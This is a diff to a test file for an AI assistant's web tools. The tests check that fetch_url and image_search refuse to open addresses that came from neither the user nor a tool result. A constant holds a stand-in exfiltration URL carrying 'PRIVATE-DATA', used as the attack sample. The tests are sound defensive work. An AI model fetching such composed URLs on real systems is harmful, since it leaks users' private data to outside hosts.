@@ -28,6 +28,7 @@ import {
 } from "$lib/server/services/file-production";
 import type { FileProductionJob } from "$lib/server/services/file-production/types";
 import { searchImages } from "$lib/server/services/image-search";
+import { ParallelApiError } from "$lib/server/services/parallel-search/client";
 import { fetchUrlViaParallel } from "$lib/server/services/parallel-search/fetch-url";
 import { researchWebViaParallel } from "$lib/server/services/parallel-search/research";
 import type { GroundedWebResult } from "$lib/server/services/parallel-search/types";
@@ -39,6 +40,7 @@ import {
 	PROVENANCE_RESULT_TOOLS,
 	resetUrlProvenanceForTests,
 } from "$lib/server/services/url-provenance";
+import { queueWebImagePreviews } from "$lib/server/services/vision/web-image-look";
 import { IMAGE_SEARCH_TOOL } from "$lib/shared/url-provenance";
 import { createNormalChatTools } from "./index";
 import { bindReadResultGrant } from "./model-payload-budget";
@@ -64,6 +66,18 @@ vi.mock("$lib/server/services/file-production", async () => {
 		),
 	};
 });
+vi.mock("$lib/server/services/vision/web-image-look", () => ({
+	queueWebImagePreviews: vi.fn(),
+}));
+vi.mock(
+	"$lib/server/services/chat-turn/ask-questions",
+	async (importOriginal) => ({
+		...(await importOriginal<
+			typeof import("$lib/server/services/chat-turn/ask-questions")
+		>()),
+		recordAskQuestion: vi.fn(async () => ({ id: "question-1" })),
+	}),
+);
 vi.mock("$lib/server/services/analytics", () => ({
 	recordParallelUsage: vi.fn(),
 }));
@@ -76,7 +90,10 @@ vi.mock("$lib/server/services/parallel-search/fetch-url", () => ({
 vi.mock("$lib/server/services/sandbox-execution", () => ({
 	executeCode: vi.fn(),
 }));
-vi.mock("$lib/server/services/image-search", () => ({
+vi.mock("$lib/server/services/image-search", async (importOriginal) => ({
+	...(await importOriginal<
+		typeof import("$lib/server/services/image-search")
+	>()),
 	searchImages: vi.fn(),
 }));
 vi.mock("$lib/server/config-store", async () => {
@@ -171,8 +188,7 @@ const googleListEventsMock = vi.mocked(googleListEvents);
 const imapReadMessageMock = vi.mocked(imapReadMessage);
 const imapGetInboxUidValidityMock = vi.mocked(imapGetInboxUidValidity);
 
-const THUMB =
-	"https://imgs.search.brave.com/Zq3s9x/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9leGFtcGxlLmNvbS9jYXQuanBn";
+const THUMB = "https://pics.example/cat.jpg";
 const EXFIL = "https://exfil.example/collect?d=PRIVATE-DATA";
 
 function requireTool<T>(tool: T | undefined): NonNullable<T> {
@@ -378,6 +394,8 @@ describe("the tool recorder feeds the user's source ledger", () => {
 				title: "Cat",
 				source: "pics.example",
 				thumbnail: THUMB,
+				provider: "parallel",
+				sourcePageUrl: "https://cats.example/cat",
 			},
 		]);
 
@@ -390,6 +408,159 @@ describe("the tool recorder feeds the user's source ledger", () => {
 		expect(hasSourceHost("user-1", "pics.example")).toBe(true);
 	});
 
+	it("refuses to inspect an address the provider echoed from the model's query", async () => {
+		searchImagesMock.mockResolvedValue([
+			{
+				provider: "parallel",
+				url: EXFIL,
+				thumbnail: EXFIL,
+				title: "A reference",
+				source: "example.com",
+				sourcePageUrl: "https://example.com/page",
+			},
+		]);
+		const set = tools({ requestText: "Find an example photo" });
+		const imageTool = requireTool(set.tools.image_search);
+		await imageTool.execute(
+			{ query: EXFIL },
+			{ toolCallId: "search", messages: [] },
+		);
+		const id = set.getToolCalls()[0]?.candidates?.[0]?.id;
+		if (!id) throw new Error("missing result");
+		expect(hasSourceThumbnail("user-1", EXFIL)).toBe(false);
+		const checked = await imageTool.execute(
+			{ action: "inspect", resultIds: [id] },
+			{ toolCallId: "inspect", messages: [] },
+		);
+		expect(checked).toMatchObject({ success: false });
+		expect(set.getToolCalls()[1]?.metadata?.reasonCode).toBe(
+			"inspection_unknown_result",
+		);
+	});
+	it("gives the model exact embed and citation URLs only for the preview that actually queued", async () => {
+		const found = ["first", "second"].map((tag) => {
+			const url = `https://pics.example/${tag}.jpg?signature=abc%2Fdef`;
+			return {
+				provider: "parallel" as const,
+				url,
+				thumbnail: url,
+				title: tag,
+				source: "publisher.example",
+				sourcePageUrl: `https://publisher.example/${tag}`,
+			};
+		});
+		searchImagesMock.mockResolvedValue(found);
+		const imageTool = requireTool(tools().tools.image_search);
+		const first = (await imageTool.execute(
+			{ query: "Two birds side by side" },
+			{ toolCallId: "search", messages: [] },
+		)) as { results: { id: string }[] };
+		const [a, b] = first.results;
+		vi.mocked(queueWebImagePreviews)
+			.mockReset()
+			.mockResolvedValueOnce({ queuedIds: [b.id], reason: "unavailable" });
+		const checked = await imageTool.execute(
+			{ action: "inspect", resultIds: [a.id, b.id] },
+			{ toolCallId: "inspect", messages: [] },
+		);
+		expect(checked).toMatchObject({
+			queuedIds: [b.id],
+			queuedImages: [
+				{ id: b.id, url: found[1].url, sourcePageUrl: found[1].sourcePageUrl },
+			],
+			unavailableIds: [a.id],
+			message: expect.stringContaining("copy its exact"),
+		});
+		expect(JSON.stringify(checked)).not.toContain(found[0].url);
+		expect(JSON.stringify(checked)).not.toContain(found[0].sourcePageUrl);
+		vi.mocked(queueWebImagePreviews).mockResolvedValueOnce({
+			queuedIds: [],
+			reason: "unavailable",
+		});
+		const failed = await imageTool.execute(
+			{ action: "inspect", resultIds: [a.id] },
+			{ toolCallId: "retry", messages: [] },
+		);
+		expect(failed).toMatchObject({ success: false, unavailableIds: [a.id] });
+		expect(JSON.stringify(failed)).not.toMatch(/https?:/);
+	});
+	it("restores only this reply's search results and remaining inspection slot after asking the user", async () => {
+		const found = ["first", "second", "third"].map((name) => {
+			const url = `https://pics.example/${name}.jpg`;
+			return {
+				provider: "parallel" as const,
+				url,
+				thumbnail: url,
+				title: name,
+				source: "pics.example",
+				sourcePageUrl: "https://pics.example",
+			};
+		});
+		searchImagesMock.mockResolvedValue(found);
+		const previews = vi.mocked(queueWebImagePreviews);
+		previews.mockReset().mockImplementation(async ({ candidates }) => ({
+			queuedIds: candidates.map((c) => c.id),
+		}));
+		const before = tools({ canPause: true });
+		const imageTool = requireTool(before.tools.image_search);
+		const options = (toolCallId: string) => ({ toolCallId, messages: [] });
+		await imageTool.execute({ query: "plugs" }, options("search"));
+		const ids = before.getToolCalls()[0].candidates?.map((c) => c.id) ?? [];
+		const inspect = (
+			set: ReturnType<typeof tools>,
+			resultIds: string[],
+			callId: string,
+		) =>
+			requireTool(set.tools.image_search).execute(
+				{ action: "inspect", resultIds },
+				options(callId),
+			);
+		expect(await inspect(before, [ids[0]], "first")).toMatchObject({
+			queuedIds: [ids[0]],
+		});
+		expect(
+			await requireTool(before.tools.ask_user).execute(
+				{
+					questions: [
+						{
+							question: "Which angle?",
+							options: [
+								{ label: "Front", recommended: true },
+								{ label: "Side" },
+							],
+						},
+					],
+				},
+				options("question"),
+			),
+		).toMatchObject({ status: "waiting_for_user" });
+		resetUrlProvenanceForTests();
+		const resumed = tools({
+			turnId: "resumed",
+			priorImageSearchCalls: before
+				.getToolCalls()
+				.filter((c) => c.name === "image_search"),
+		});
+		expect(await inspect(resumed, [ids[1], ids[2]], "second")).toMatchObject({
+			queuedIds: [ids[1]],
+		});
+		expect(await inspect(resumed, [ids[2]], "third")).toMatchObject({
+			success: false,
+		});
+		expect(resumed.getToolCalls().at(-1)?.metadata?.reasonCode).toBe(
+			"inspection_budget",
+		);
+		for (const userId of ["user-1", "user-2"]) {
+			const fresh = tools({ userId, turnId: "new-turn" });
+			expect(await inspect(fresh, [ids[1]], "other")).toMatchObject({
+				success: false,
+			});
+			expect(fresh.getToolCalls()[0].metadata?.reasonCode).toBe(
+				"inspection_unknown_result",
+			);
+		}
+		expect(previews).toHaveBeenCalledTimes(2);
+	});
 	it("notes the ledger before the call reaches the recorder the stream reads from", async () => {
 		researchWebViaParallelMock.mockResolvedValue(
 			groundedResult({ urls: ["https://first.example/a"] }),
@@ -427,6 +598,8 @@ describe("the tool recorder feeds the user's source ledger", () => {
 				title: "Cat",
 				source: "x",
 				thumbnail: THUMB,
+				provider: "parallel",
+				sourcePageUrl: "https://cats.example/cat",
 			},
 		]);
 		const before = changes();
@@ -769,6 +942,163 @@ describe("fetch_url opens only an address the user typed or a tool returned", ()
 	});
 });
 
+// A tool row says why a page could not be read from a code on the entry's
+// metadata. The code rides beside the model's payload: what the model reads, the
+// entry's outputSummary and its stored status are what they always were.
+describe("fetch_url names what happened", () => {
+	const PAGE = "https://example.com/page";
+	const GRANT = {
+		kind: "admitted" as const,
+		turnId: "t",
+		segmentId: "s",
+		attemptId: "a",
+		stepId: "step",
+		executionId: "e",
+		proposalOrdinal: 0,
+		maxPayloadTokens: 8_000,
+		maxFailurePayloadTokens: 256,
+	};
+
+	async function fetchWithBudget(
+		set: ReturnType<typeof tools>,
+		kind: "admitted" | "denied" = "admitted",
+	) {
+		return (await requireTool(set.tools.fetch_url).execute(
+			{ urls: [PAGE] },
+			bindReadResultGrant(
+				{ toolCallId: "call-budget", messages: [] },
+				kind === "admitted" ? GRANT : { ...GRANT, kind, maxPayloadTokens: 0 },
+			),
+		)) as Record<string, unknown>;
+	}
+
+	it("names a link that came from neither the person nor a tool", async () => {
+		const set = tools();
+
+		await fetchUrl(set, [EXFIL], "call-refused");
+
+		const [entry] = set.getToolCalls();
+		expect(entry?.metadata).toMatchObject({
+			ok: false,
+			refusedUrlCount: 1,
+			reasonCode: "link_not_from_a_source",
+		});
+	});
+
+	it("names a page reader that answered with an error, and the model reads the same", async () => {
+		const message = "Parallel extract failed: 500 Internal Server Error boom";
+		const set = tools({ requestText: `Read ${PAGE}` });
+		fetchUrlViaParallelMock.mockRejectedValueOnce(
+			new ParallelApiError(message, 500),
+		);
+
+		const result = await fetchUrl(set, [PAGE]);
+
+		expect(result).toEqual({ success: false, error: message });
+		const [entry] = set.getToolCalls();
+		expect(entry?.status).toBe("done");
+		expect(entry?.outputSummary).toBe(message);
+		expect(entry?.metadata).toMatchObject({
+			ok: false,
+			error: message,
+			reasonCode: "read_unavailable",
+		});
+	});
+
+	it("names nothing for any other failure: the row says its own fallback", async () => {
+		const set = tools({ requestText: `Read ${PAGE}` });
+		fetchUrlViaParallelMock.mockRejectedValueOnce(new Error("upstream 502"));
+
+		await fetchUrl(set, [PAGE]);
+
+		const [entry] = set.getToolCalls();
+		expect(entry?.metadata).not.toHaveProperty("reasonCode");
+	});
+
+	it("names why no page could be read when the Extract API said, and the payload is what it was", async () => {
+		const failed = groundedResult({ urls: [PAGE], failed: true });
+		const plain = tools({ requestText: `Read ${PAGE}` });
+		fetchUrlViaParallelMock.mockResolvedValueOnce(failed);
+		const before = await fetchUrl(plain, [PAGE]);
+
+		const named = tools({ requestText: `Read ${PAGE}` });
+		fetchUrlViaParallelMock.mockResolvedValueOnce({
+			...failed,
+			readFailure: "page_not_found",
+		});
+		const after = await fetchUrl(named, [PAGE]);
+
+		expect(after).toEqual(before);
+		const [entry] = named.getToolCalls();
+		expect(entry?.outputSummary).toBe(plain.getToolCalls()[0]?.outputSummary);
+		expect(entry?.metadata).toMatchObject({ reasonCode: "page_not_found" });
+		expect(plain.getToolCalls()[0]?.metadata).not.toHaveProperty("reasonCode");
+	});
+
+	it("names nothing for a read that brought back a page", async () => {
+		const set = tools({ requestText: `Read ${PAGE}` });
+
+		await fetchUrl(set, [PAGE]);
+
+		const [entry] = set.getToolCalls();
+		expect(entry?.metadata).not.toHaveProperty("reasonCode");
+	});
+
+	describe("with a result budget (the way a turn runs it)", () => {
+		it("keeps the reason a read named when the budget records its fixed failure", async () => {
+			const recorder = createToolCallRecorder();
+			const set = tools({ recorder, requestText: `Read ${PAGE}` });
+			fetchUrlViaParallelMock.mockResolvedValueOnce({
+				...groundedResult({ urls: [PAGE], failed: true }),
+				readFailure: "site_refused",
+			});
+
+			const result = await fetchWithBudget(set);
+
+			expect(result).toMatchObject({ success: false, bounded: true });
+			const [entry] = recorder.getEntries();
+			expect(entry?.status).toBe("failed");
+			expect(entry?.metadata).toMatchObject({
+				ok: false,
+				bounded: true,
+				reasonCode: "site_refused",
+			});
+		});
+
+		it("names a link that came from neither as link_not_from_a_source through the fixed failure", async () => {
+			const recorder = createToolCallRecorder();
+			const set = tools({ recorder });
+
+			await requireTool(set.tools.fetch_url).execute(
+				{ urls: [EXFIL] },
+				bindReadResultGrant({ toolCallId: "call-budget", messages: [] }, GRANT),
+			);
+
+			const [entry] = recorder.getEntries();
+			expect(entry?.metadata).toMatchObject({
+				ok: false,
+				reasonCode: "link_not_from_a_source",
+			});
+		});
+
+		it("names a read the turn's reading budget refused as reading_budget_used", async () => {
+			const recorder = createToolCallRecorder();
+			const set = tools({ recorder, requestText: `Read ${PAGE}` });
+
+			const result = await fetchWithBudget(set, "denied");
+
+			expect(fetchUrlViaParallelMock).not.toHaveBeenCalled();
+			expect(result).toMatchObject({ success: false, bounded: true });
+			const [entry] = recorder.getEntries();
+			expect(entry?.status).toBe("failed");
+			expect(entry?.metadata).toMatchObject({
+				ok: false,
+				reasonCode: "reading_budget_used",
+			});
+		});
+	});
+});
+
 describe("a connector result a local model summarised gives fetch_url only its own sources", () => {
 	// With a cloud chat model and local summarising on, a connector hands the
 	// model text a local model wrote after reading the user's events and mail, a
@@ -1015,6 +1345,8 @@ describe("produce_file leaves out a picture whose address has no source", () => 
 				title: "Cat",
 				source: "pics.example",
 				thumbnail: THUMB,
+				provider: "parallel",
+				sourcePageUrl: "https://cats.example/cat",
 			},
 		]);
 		const set = tools();
